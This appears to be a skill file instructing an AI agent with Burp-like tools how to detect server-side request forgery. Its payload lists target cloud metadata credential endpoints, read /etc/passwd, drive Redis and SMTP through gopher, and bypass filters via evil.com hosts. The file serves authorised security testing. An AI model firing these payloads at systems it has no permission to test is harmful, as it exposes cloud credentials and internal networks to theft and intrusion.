# SSRF Detection Skill

## Objective
Identify Server-Side Request Forgery (SSRF) vulnerabilities where the server can be tricked into making requests to unintended locations.

## Instructions

### 1. Identify SSRF-Prone Parameters
Look for parameters that accept URLs or hostnames:
```
url, uri, path, dest, redirect, uri, continue, url, window,
next, data, reference, site, html, val, validate, domain,
callback, return, page, feed, host, port, to, out, view,
dir, show, navigation, open, file, document, folder, pg,
style, doc, img, source, target, link, href, src, proxy,
image, webhook, download, preview, fetch, load
```

Also check HTTP headers:
- X-Forwarded-Host
- X-Forwarded-For
- X-Original-URL
- X-Rewrite-URL
- Referer
- Host

### 2. Basic SSRF Detection
Use `collaborator_generate` for OOB detection:

**HTTP callback:**
```
http://COLLABORATOR/ssrf
https://COLLABORATOR/ssrf
```

**DNS callback:**
```
http://ssrf.COLLABORATOR
```

### 3. Internal Network Targeting

**Localhost variants:**
```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.1
http://0
http://0.0.0.0
```

**IPv6 localhost:**
```
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]
```

**Alternative representations:**
```
http://2130706433  # Decimal: 127.0.0.1
http://0x7f000001  # Hex: 127.0.0.1
http://0177.0.0.1  # Octal: 127.0.0.1
http://0x7f.0x0.0x0.0x1  # Hex octets
http://127.1        # Short form
http://127.0.1      # Short form
```

### 4. Cloud Metadata Endpoints

**AWS:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```
(Requires header: `Metadata-Flavor: Google`)

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token
```
(Requires header: `Metadata: true`)

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1/
```

**Oracle Cloud:**
```
http://169.254.169.254/opc/v1/instance/
```

### 5. URL Parsing Bypass Techniques

**@ symbol bypass:**
```
http://evil.com@127.0.0.1
http://127.0.0.1:80@evil.com
http://127.0.0.1%00@evil.com
```

**URL encoding:**
```
http://127.0.0.1%2f
http://127.0.0.1%23
http://%31%32%37%2e%30%2e%30%2e%31
```

**Double encoding:**
```
http://127.0.0.1%252f
```

**Unicode normalization:**
```
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ
http://①②⑦.⓪.⓪.①
```

**Domain confusion:**
```
http://127.0.0.1.evil.com
http://evil.127.0.0.1
http://localtest.me  # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net  # DNS rebinding
```

**Protocol smuggling:**
```
gopher://127.0.0.1:25/_HELO
dict://127.0.0.1:11211/stat
file:///etc/passwd
ldap://127.0.0.1/
```

**Redirect bypass:**
```
http://evil.com/redirect?url=http://127.0.0.1
```
Host a redirect on your server pointing to internal targets.

### 6. DNS Rebinding
For time-based filters:
1. Set up a domain with very low TTL
2. First resolve to allowed IP
3. Subsequent resolves to 127.0.0.1

### 7. Protocol-Specific Attacks

**Gopher protocol (if supported):**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a  # Redis
gopher://127.0.0.1:25/_HELO%20localhost%0d%0a  # SMTP
```

**File protocol:**
```
file:///etc/passwd
file:///c:/windows/win.ini
```

### 8. Blind SSRF Detection
When no direct response:
1. Use `collaborator_generate` for OOB callback
2. Check response time differences for port scanning
3. Look for error messages revealing internal behavior

**Time-based detection:**
```
# Compare response times
http://10.0.0.1:22  # SSH - may respond
http://10.0.0.1:81  # Likely closed - timeout
```

### 9. SSRF via Other Vulnerabilities

**Via XXE:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/">
]>
```

**Via PDF generation:**
```html
<iframe src="http://internal-server/">
<img src="http://internal-server/">
```

**Via SVG:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://internal-server/"/>
</svg>
```

### 10. Confirm and Document
Use `collaborator_poll` to verify OOB interactions.

If confirmed, create finding with:
- Vulnerable parameter
- Working payload
- Internal resources accessible
- Evidence (Collaborator interaction, response content)
- Impact (internal network access, cloud metadata, etc.)

## MCP Tools to Use
- `params_extract`: Find URL-accepting parameters
- `http1_request` / `http2_request`: Send test requests
- `collaborator_generate` / `collaborator_poll`: OOB detection
- `repeater_tab_with_payload`: Manual testing
- `intruder_prepare`: Port scanning, IP enumeration
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/Server Side Request Forgery
- PortSwigger SSRF Research
